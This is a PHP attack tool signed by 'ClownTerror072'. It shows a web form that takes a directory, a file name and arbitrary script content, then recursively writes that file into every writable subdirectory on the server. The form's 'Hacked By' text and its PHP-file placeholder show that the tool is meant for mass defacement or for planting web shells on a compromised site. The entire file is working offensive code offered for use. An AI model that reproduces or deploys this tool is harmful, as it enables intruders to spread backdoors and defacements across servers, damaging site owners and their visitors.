<?php
// ClownTerror072
// PsychoXploit

function bikin_file($namafile,$script){
$fp2 = fopen($namafile,"w");
fputs($fp2,$script);

}
function buka_dir($getcwd){
	if(is_writable($getcwd)){
	$nama = $_POST['nama'];
	$script = $_POST['script'];
	$a = scandir("$getcwd");
foreach($a as $aa){
	if($aa == "." | $aa == ".."){
	}elseif(is_dir("$getcwd/$aa")){

		$dir_baru = "$getcwd/$aa";
		if(is_writable($dir_baru)){
		echo "$dir_baru/$nama <== sukses<br>";
		$create_file = bikin_file("$dir_baru/$nama", "$script");
		$baa = buka_dir($dir_baru);
	}
	else{
		echo "gagal dir not writeable";
	}
}
}	
}
else{
	echo "gagal dir not writeable";
}
}
if($_POST){
$cwd = $_POST['dir'];
$coba = buka_dir($cwd);
echo $coba;
}
else{
	echo '<html>
	<head>
		<title>Created By ClownTerror072</title>
	</head>

	<body>
			<center>
				<font face="Orbitron"<font size="7">Coded By ClownTerror072</font>
						<table>
							<tr><td><form method="post" action="?action"></td></tr>
							<tr><td><input type="text" name="dir" placeholder="Dir"></td> </tr>
							<tr><td><input type="text" name="nama" placeholder="kntl.php / Nama Filenya"></td> </tr>
							<tr><td><textarea rows="10" cols="19px" name="script" placeholder="Hacked By ClownTerror072/ Script"></textarea></td></tr>

							<br><tr><td><input type="submit" value="Submit"></td></tr>
							</form>
						</table>
						<font color="red">*contact:clownterror072@gmail.com</font>
			</center>

	</body>
</html>';
}
?>